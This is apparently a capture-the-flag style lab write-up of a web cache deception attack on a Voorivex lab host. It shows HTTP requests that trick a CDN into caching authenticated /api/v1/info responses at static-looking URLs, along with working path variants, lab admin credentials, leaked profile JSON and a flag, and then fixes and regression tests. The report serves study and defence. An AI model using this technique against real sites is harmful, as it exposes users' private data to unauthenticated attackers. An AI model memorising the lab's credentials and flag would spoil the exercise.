# Catch me — Web Cache Deception

**Target:** Voorivex lab (`05r1qm7mwf.voorivex-lab.online`)  
**Category:** Cache Vulnerabilities  
**Date:** 2026-07-11

## Summary

Authenticated user data from `/api/v1/info` can be leaked by tricking the CDN into caching it at a static-looking URL such as `/api/v1/info.css`. After the victim visits the crafted link while logged in, an unauthenticated attacker can retrieve the cached JSON response.

## Reproduction

1. Log in with `admin` / `@AdMin1234!`.
2. Identify the sensitive endpoint loaded by `/profile`:

```http
GET /api/v1/info HTTP/1.1
Cookie: token=...
```

Response contains private fields and a `key` value.

3. Probe extension-based cache behavior:

```http
GET /api/v1/info.css HTTP/1.1
```

- Authenticated: `200`, JSON body, `cache-control: max-age=14400`
- Unauthenticated (cold): `301`, empty body

4. Poison the cache as the victim:

```http
GET /api/v1/info.css HTTP/1.1
Cookie: token=<victim-session>
```

5. Retrieve the cached response without a session:

```http
GET /api/v1/info.css HTTP/1.1
```

Expected: `200` with the victim's JSON, including `key`.

## Exploit link

```
https://05r1qm7mwf.voorivex-lab.online/api/v1/info.css
```

Working variants:

- `/api/v1/info.min.css`
- `/api/v1/info/<arbitrary>.css`
- `.js`, `.png`, `.ico`, `.svg` also triggered cacheable authenticated responses

## Evidence

After admin visited `/api/v1/info/cacheattack.css` while authenticated, a logged-out browser request to the same URL returned:

```json
{"FirstName":"Sadra","LastName":"Asadi","Email":"mr.msa7@gmail.com","Phone":"09171230123","Address":"Iran, Tehran","Job":"Bug bounty hunter","key":"FLAG_32c74de74553e2df8cb793adc6d0f1c4"}
```

## Root cause

The origin maps static-looking paths to the dynamic `/api/v1/info` handler and returns `cache-control: max-age=14400` for those URLs. The CDN caches the authenticated response under a cache key that does not isolate session state.

## Impact

Unauthenticated disclosure of victim profile data and secret `key` material for any user tricked into visiting the deception URL while logged in.

## Fix

- Never cache authenticated responses.
- Return `404` for non-existent static paths instead of serving dynamic handlers.
- Force `Cache-Control: private, no-store` on all `/api/v1/info` variants.
- Enable CDN cache deception protections.

## Regression test

1. Authenticated request to `/api/v1/info.css` must not produce a cacheable public response.
2. Unauthenticated request after victim visit must not return victim JSON.
3. Verify `Vary: Cookie` or equivalent session-aware cache keying on sensitive routes.
